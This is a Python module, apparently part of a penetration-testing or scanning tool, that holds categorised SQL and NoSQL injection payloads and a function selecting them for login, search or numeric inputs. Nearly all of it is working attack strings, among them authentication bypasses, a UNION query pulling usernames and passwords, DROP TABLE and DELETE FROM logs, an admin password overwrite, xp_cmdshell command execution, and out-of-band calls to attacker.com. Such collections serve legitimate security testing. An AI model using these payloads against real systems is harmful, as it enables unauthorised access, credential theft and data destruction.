"""
SQL Injection Payloads library.
"""

# Error-based SQL injection payloads
ERROR_BASED = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1--",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "') OR ('a'='a",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE users--",
    "1; SELECT * FROM users",
    "admin'--",
    "1' AND '1'='2",
    "1' AND '1'='1",
]

# Blind SQL injection payloads
BLIND_BOOLEAN = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1' AND 1=1--+",
    "1' AND 1=2--+",
    "' OR 1=1--",
    "' OR 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
]

# Time-based blind SQL injection payloads
TIME_BASED = {
    "mysql": [
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "1; SELECT SLEEP(5)",
        "' OR IF(1=1,SLEEP(5),0)--",
    ],
    "postgresql": [
        "' OR pg_sleep(5)--",
        "1' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'",
        "' OR WAITFOR DELAY '0:0:5'--",
    ],
    "oracle": [
        "' OR DBMS_LOCK.SLEEP(5)--",
        "1' AND DBMS_LOCK.SLEEP(5)--",
    ],
}

# UNION-based SQL injection payloads
UNION_BASED = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT 1,2--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,null FROM information_schema.tables--",
]

# Out-of-band SQL injection payloads
OUT_OF_BAND = {
    "mysql": [
        "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\a')--",
    ],
    "mssql": [
        "'; exec master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--",
    ],
}

# Stacked queries
STACKED_QUERIES = [
    "'; INSERT INTO users VALUES('hacker','hacked')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; DELETE FROM logs--",
    "'; EXEC xp_cmdshell('whoami')--",
]

# Authentication bypass payloads
AUTH_BYPASS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "') OR '1'='1'--",
    "' OR ''='",
    "' OR 1 --'",
    "or 1=1",
    "or 1=1--",
    "' or ''-'",
    "' or '' '",
    "' or ''&'",
    "' or ''^'",
    "' or ''*'",
    "or true--",
    "' OR 'x'='x",
    "') OR ('x'='x",
]

# NoSQL injection payloads
NOSQL = [
    "{'$gt': ''}",
    "{'$ne': ''}",
    "{'$regex': '.*'}",
    "true, $where: '1 == 1'",
    ", $where: '1 == 1'",
    "$where: function() { return true; }",
    "'; return true; var foo='",
    "'; while(true){}; var foo='",
]

# All payloads combined
ALL_PAYLOADS = (
    ERROR_BASED + 
    BLIND_BOOLEAN + 
    UNION_BASED + 
    AUTH_BYPASS
)

def get_payloads_for_context(context: str = "general") -> list:
    """
    Get appropriate payloads for a given context.
    
    Args:
        context: Type of injection context
        
    Returns:
        List of payloads
    """
    if context == "login":
        return AUTH_BYPASS
    elif context == "search":
        return ERROR_BASED + UNION_BASED
    elif context == "numeric":
        return ["1 OR 1=1", "1 AND 1=1", "1; SELECT 1"]
    else:
        return ALL_PAYLOADS
